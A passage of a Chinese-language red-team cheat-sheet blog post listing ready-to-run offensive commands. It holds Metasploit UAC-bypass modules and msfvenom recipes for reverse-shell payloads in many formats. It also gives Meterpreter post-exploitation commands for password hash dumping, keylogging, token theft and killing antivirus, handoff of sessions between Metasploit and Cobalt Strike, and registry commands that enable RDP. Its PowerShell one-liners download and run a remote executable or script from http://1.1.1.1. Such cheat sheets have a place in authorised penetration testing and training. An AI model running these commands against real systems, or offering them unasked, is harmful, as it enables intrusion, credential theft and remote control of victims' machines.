<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">exploit/windows/local/bypassuac<br>exploit/windows/local/bypassuac_comhijack<br>exploit/windows/local/bypassuac_eventvwr<br>exploit/windows/local/bypassuac_fodhelper<br>exploit/windows/local/bypassuac_injection<br>exploit/windows/local/bypassuac_injection_winsxs<br>exploit/windows/local/bypassuac_silentcleanup<br>exploit/windows/local/bypassuac_sluihijack<br>exploit/windows/local/bypassuac_vbs<br></code></pre></td></tr></table></figure>

<h4 id="msfenvom生成shell-code"><a href="#msfenvom生成shell-code" class="headerlink" title="msfenvom生成shell code"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#msfenvom%E7%94%9F%E6%88%90shell-code"></a>msfenvom生成shell code</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Windows:<br>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f c &gt; shellcode.c<br><br>Linux:<br>msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f c &gt; shellcode.c<br><br>Mac:<br>msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=攻击机IP LPORT=攻击机端口 -f c &gt; shellcode.c<br></code></pre></td></tr></table></figure>

<h4 id="msfenvom生成可执行文件"><a href="#msfenvom生成可执行文件" class="headerlink" title="msfenvom生成可执行文件"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#msfenvom%E7%94%9F%E6%88%90%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6"></a>msfenvom生成可执行文件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Linux:<br>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf<br><br>Windows:<br>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe<br>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.174.128 LPORT=4444 -f exe &gt; shell.exe<br><br>Mac:<br>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho<br><br>PHP:<br>msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php<br>cat shell.php | pbcopy &amp;&amp; echo &#x27;&lt;?php &#x27; | tr -d &#x27;\n&#x27; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php<br><br>ASP:<br>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp<br><br>JSP:<br>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp<br><br>WAR:<br>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war<br><br>Python:<br>msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py<br><br>Bash:<br>msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh<br><br>Perl:<br>msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl<br></code></pre></td></tr></table></figure>

<h4 id="Meterpreter常用命令"><a href="#Meterpreter常用命令" class="headerlink" title="Meterpreter常用命令"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#meterpreter%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"></a>Meterpreter常用命令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">meterpreter &gt; background  放回后台<br>meterpreter &gt; exit  关闭会话<br>meterpreter &gt; help  帮助信息<br>meterpreter &gt; sysinfo系统平台信息<br>meterpreter &gt; screenshot  屏幕截取<br>meterpreter &gt; shell  命令行shell (exit退出)<br>meterpreter &gt; getlwd  查看本地目录<br>meterpreter &gt; lcd  切换本地目录<br>meterpreter &gt; getwd  查看目录<br>meterpreter &gt; ls 查看文件目录列表<br>meterpreter &gt; cd  切换目录 <br>meterpreter &gt; rm  删除文件 <br>meterpreter &gt; download C:\\Users\\123\\Desktop\\1.txt 1.txt 下载文件<br>meterpreter &gt; upload /var/www/wce.exe wce.exe  上传文件<br>meterpreter &gt; search -d c:  -f *.doc  搜索文件<br>meterpreter &gt; execute -f  cmd.exe -i   执行程序/命令 <br>meterpreter &gt; ps  查看进程<br>meterpreter &gt; run post/windows/capture/keylog_recorder   键盘记录<br>meterpreter &gt; getuid  查看当前用户权限<br>meterpreter &gt; use priv  加载特权模块<br>meterpreter &gt; getsystem  提升到SYSTEM权限<br>meterpreter &gt; hashdump  导出密码散列<br>meterpreter &gt; ps   查看高权限用户PID<br>meterpreter &gt; steal_token &lt;PID&gt;  窃取令牌<br>meterpreter &gt; rev2self  恢复原来的令牌 <br>meterpreter &gt; migrate pid  迁移进程<br>meterpreter &gt; run killav  关闭杀毒软件 <br>meterpreter &gt; run getgui-e  启用远程桌面<br>meterpreter &gt; portfwd add -l 1234 -p 3389 -r &lt;目标IP&gt;  端口转发<br>meterpreter &gt; run get_local_subnets  获取内网网段信息<br>meterpreter &gt; run autoroute -s &lt;内网网段&gt;  创建自动路由<br>meterpreter &gt; run autoroute -p  查看自动路由表<br></code></pre></td></tr></table></figure>

<h3 id="各种shell的相互转换"><a href="#各种shell的相互转换" class="headerlink" title="各种shell的相互转换"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E5%90%84%E7%A7%8Dshell%E7%9A%84%E7%9B%B8%E4%BA%92%E8%BD%AC%E6%8D%A2"></a>各种shell的相互转换</h3><h4 id="msf派生shell给cobalt-Strike"><a href="#msf派生shell给cobalt-Strike" class="headerlink" title="msf派生shell给cobalt Strike"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#msf%E6%B4%BE%E7%94%9Fshell%E7%BB%99cobalt-strike"></a>msf派生shell给cobalt Strike</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">background<br>use exploit/windows/local/payload_inject<br>set payload windows/meterpreter/reverse_http<br>set LHOST xx.x.x.x  # CS IP<br>set LPORT xx        # CS http监听端口<br>set session 1<br>set DISABLEPAYLOADHANDLER true<br>run<br></code></pre></td></tr></table></figure>

<h4 id="cobalt-Strike联动msf"><a href="#cobalt-Strike联动msf" class="headerlink" title="cobalt Strike联动msf"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#cobalt-strike%E8%81%94%E5%8A%A8msf"></a>cobalt Strike联动msf</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">use exploit/multi/handler<br>set payload windows/meterpreter/reverse_http<br>set lhost xx.xx.xx.xx<br>set lport xx<br>run<br></code></pre></td></tr></table></figure>

<p>选择 foreign 类型的监听进行 Spawn，填写 MSF 的 IP 和监听端口。</p>
<h4 id="command-shell转meterpreter"><a href="#command-shell转meterpreter" class="headerlink" title="command shell转meterpreter"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#command-shell%E8%BD%ACmeterpreter"></a>command shell转meterpreter</h4><p>接收普通shell：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">use exploit/multi/handlerset payload windows/shell/reverse_tcprun<br></code></pre></td></tr></table></figure>

<p>ctrl+Z将反弹的普通shell放置后台，调用shell_to_meterpreter模块升级普通shell：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">use post/multi/manage/shell_to_meterpreterset SESSION &lt;id&gt;set LPORT run<br></code></pre></td></tr></table></figure>

<p>再次输入sessions -l 查看后台的sessions，新增了meterpreter shell。</p>
<h4 id="meterpreter转command-shell"><a href="#meterpreter转command-shell" class="headerlink" title="meterpreter转command shell"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#meterpreter%E8%BD%ACcommand-shell"></a>meterpreter转command shell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">meterpreter &gt; shell  命令行shell (exit退出)<br></code></pre></td></tr></table></figure>

<h2 id="内网其他命令"><a href="#内网其他命令" class="headerlink" title="内网其他命令"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#%E5%86%85%E7%BD%91%E5%85%B6%E4%BB%96%E5%91%BD%E4%BB%A4"></a>内网其他命令</h2><h3 id="3389端口开放"><a href="#3389端口开放" class="headerlink" title="3389端口开放"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#3389%E7%AB%AF%E5%8F%A3%E5%BC%80%E6%94%BE"></a>3389端口开放</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">wmic /namespace:\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS != &quot;&quot;) call setallowtsconnections 1<br>wmic /namespace:\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName =&#x27;RDP-Tcp&#x27;) call setuserauthenticationrequired 1<br>reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f<br>net start TermService<br></code></pre></td></tr></table></figure>

<h3 id="powershell文件下载"><a href="#powershell文件下载" class="headerlink" title="powershell文件下载"></a><a target="_blank" rel="noopener" href="https://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5.md#powershell%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"></a>powershell文件下载</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">powershell (new-object System.Net.WebClient).DownloadFile(&#x27;http://1.1.1.1/test.exe&#x27;,&#x27;C:\test.exe&#x27;);start-process &#x27;C:\test.exe&#x27;<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">powershell (new-object System.Net.WebClient).DownloadFile(&#x27;http://1.1.1.1/test.exe&#x27;,&#x27;test.exe&#x27;)<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Invoke-Expression (New-Object Net.WebClient).DownloadString(&quot;http://1.1.1.1/test.ps1&quot;)<br></code></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">echo (new-object System.Net.WebClient).DownloadFile(&#x27;http://1.1.1.1/test.exe&#x27;,&#x27;C:/test.exe&#x27;)| powershell -<br></code></pre></td></tr></table></figure>
<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/09/14/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7%E9%80%9F%E6%9F%A5/">漏洞利用技巧速查 Prev →</a></div></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="文章目录">≡</a><a id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">John Doe</a></h1><div id="description"><p></p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5"><span class="toc-number">1.</span> <span class="toc-text">攻防渗透常用命令速查</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95"><span class="toc-number">1.1.</span> <span class="toc-text">目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9Shell"><span class="toc-number">1.2.</span> <span class="toc-text">反弹Shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bash"><span class="toc-number">1.2.1.</span> <span class="toc-text">bash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#curl"><span class="toc-number">1.2.2.</span> <span class="toc-text">curl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#http"><span class="toc-number">1.2.3.</span> <span class="toc-text">http</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#java"><span class="toc-number">1.2.4.</span> <span class="toc-text">java</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssh%E6%97%A0%E8%AE%B0%E5%BD%95shell"><span class="toc-number">1.2.5.</span> <span class="toc-text">ssh无记录shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#python%E4%BA%A4%E4%BA%92shell"><span class="toc-number">1.2.6.</span> <span class="toc-text">python交互shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%BE%E7%89%87%E9%A9%AC%E5%88%B6%E4%BD%9C"><span class="toc-number">1.2.7.</span> <span class="toc-text">图片马制作</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%89%E9%A6%96%E5%AD%97%E6%AF%8D%E6%8E%92%E5%BA%8F"><span class="toc-number">1.3.</span> <span class="toc-text">按首字母排序</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AlliN"><span class="toc-number">1.3.1.</span> <span class="toc-text">AlliN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Arjun"><span class="toc-number">1.3.2.</span> <span class="toc-text">Arjun</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dirsearch"><span class="toc-number">1.3.3.</span> <span class="toc-text">dirsearch</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dirmap"><span class="toc-number">1.3.4.</span> <span class="toc-text">dirmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EHole"><span class="toc-number">1.3.5.</span> <span class="toc-text">EHole</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ENScan-GO"><span class="toc-number">1.3.6.</span> <span class="toc-text">ENScan_GO</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#find"><span class="toc-number">1.3.7.</span> <span class="toc-text">find</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ffuf"><span class="toc-number">1.3.8.</span> <span class="toc-text">ffuf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fscan"><span class="toc-number">1.3.9.</span> <span class="toc-text">fscan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#grep"><span class="toc-number">1.3.10.</span> <span class="toc-text">grep</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hping3"><span class="toc-number">1.3.11.</span> <span class="toc-text">hping3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hydra"><span class="toc-number">1.3.12.</span> <span class="toc-text">hydra</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JNDI"><span class="toc-number">1.3.13.</span> <span class="toc-text">JNDI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HackBrowerserData"><span class="toc-number">1.3.14.</span> <span class="toc-text">HackBrowerserData</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#kscan"><span class="toc-number">1.3.15.</span> <span class="toc-text">kscan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ksubdomain"><span class="toc-number">1.3.16.</span> <span class="toc-text">ksubdomain</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql"><span class="toc-number">1.3.17.</span> <span class="toc-text">mysql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#medusa"><span class="toc-number">1.3.18.</span> <span class="toc-text">medusa</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap"><span class="toc-number">1.3.19.</span> <span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OneForAll"><span class="toc-number">1.3.20.</span> <span class="toc-text">OneForAll</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#scaninfo"><span class="toc-number">1.3.21.</span> <span class="toc-text">scaninfo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap"><span class="toc-number">1.3.22.</span> <span class="toc-text">sqlmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TideFinger"><span class="toc-number">1.3.23.</span> <span class="toc-text">TideFinger</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#URLFinder"><span class="toc-number">1.3.24.</span> <span class="toc-text">URLFinder</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Vulmap"><span class="toc-number">1.3.25.</span> <span class="toc-text">Vulmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Xray"><span class="toc-number">1.3.26.</span> <span class="toc-text">Xray</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9E%E6%8E%A5"><span class="toc-number">1.4.</span> <span class="toc-text">数据库连接</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis"><span class="toc-number">1.4.1.</span> <span class="toc-text">Redis</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Postgresql"><span class="toc-number">1.4.2.</span> <span class="toc-text">Postgresql</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.5.</span> <span class="toc-text">内网信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8D%E8%A6%81%E7%AB%AF%E5%8F%A3%E5%8F%8A%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.5.1.</span> <span class="toc-text">重要端口及服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.5.2.</span> <span class="toc-text">Windows信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E6%96%87%E4%BB%B6-find-x2F-findstr"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">查找文件 find&#x2F;findstr</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE%E6%B4%BB%E5%8A%A8%E4%BB%A3%E7%A0%81%E9%A1%B5%E7%BC%96%E5%8F%B7-chcp"><span class="toc-number">1.5.2.2.</span> <span class="toc-text">设置活动代码页编号 chcp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF-systeminfo"><span class="toc-number">1.5.2.3.</span> <span class="toc-text">查看系统信息 systeminfo</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F-set"><span class="toc-number">1.5.2.4.</span> <span class="toc-text">查看环境变量 set</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF-ipconfig"><span class="toc-number">1.5.2.5.</span> <span class="toc-text">查看网络配置信息 ipconfig</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF-whoami"><span class="toc-number">1.5.2.6.</span> <span class="toc-text">查看当前用户信息 whoami</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E8%B7%AF%E7%94%B1%E8%A1%A8-route"><span class="toc-number">1.5.2.7.</span> <span class="toc-text">查看路由表 route</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8Barp%E7%BC%93%E5%AD%98%E8%A1%A8-arp"><span class="toc-number">1.5.2.8.</span> <span class="toc-text">查看arp缓存表 arp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF-net-user-x2F-localgroup"><span class="toc-number">1.5.2.9.</span> <span class="toc-text">查看用户信息 net user&#x2F;localgroup</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E4%B8%BB%E6%9C%BA%E5%BC%80%E5%90%AF%E6%97%B6%E9%97%B4-net-statistics"><span class="toc-number">1.5.2.10.</span> <span class="toc-text">查看主机开启时间 net statistics</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%AE%89%E8%A3%85%E8%BD%AF%E4%BB%B6%E5%8F%8A%E7%89%88%E6%9C%AC%E4%BF%A1%E6%81%AF-wmic-product"><span class="toc-number">1.5.2.11.</span> <span class="toc-text">查看安装软件及版本信息 wmic product</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8PowerShell%E6%94%B6%E9%9B%86%E8%BD%AF%E4%BB%B6%E7%89%88%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.2.12.</span> <span class="toc-text">利用PowerShell收集软件版本信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%9C%AC%E6%9C%BA%E6%9C%8D%E5%8A%A1%E4%BF%A1%E6%81%AF-wmic-service"><span class="toc-number">1.5.2.13.</span> <span class="toc-text">查看本机服务信息 wmic service</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E8%A1%A5%E4%B8%81%E4%BF%A1%E6%81%AF-wmic-qfe"><span class="toc-number">1.5.2.14.</span> <span class="toc-text">查看补丁信息 wmic qfe</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#metasploit-enum-patches"><span class="toc-number">1.5.2.14.1.</span> <span class="toc-text">metasploit enum_patches</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#windows-exploit-suggester"><span class="toc-number">1.5.2.14.2.</span> <span class="toc-text">windows exploit suggester</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%85%B1%E4%BA%AB%E5%88%97%E8%A1%A8-wmic-share"><span class="toc-number">1.5.2.15.</span> <span class="toc-text">查看共享列表 wmic share</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E8%BF%9B%E7%A8%8B%E5%88%97%E8%A1%A8-tasklist"><span class="toc-number">1.5.2.16.</span> <span class="toc-text">查看进程列表 tasklist</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1-schtasks"><span class="toc-number">1.5.2.17.</span> <span class="toc-text">查看计划任务 schtasks</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%AB%AF%E5%8F%A3%E4%BF%A1%E6%81%AF-netstat"><span class="toc-number">1.5.2.18.</span> <span class="toc-text">查看端口信息 netstat</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E9%98%B2%E7%81%AB%E5%A2%99%E9%85%8D%E7%BD%AE-netsh"><span class="toc-number">1.5.2.19.</span> <span class="toc-text">查看防火墙配置 netsh</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8Bwifi%E4%BF%A1%E6%81%AF"><span class="toc-number">1.5.2.20.</span> <span class="toc-text">查看wifi信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 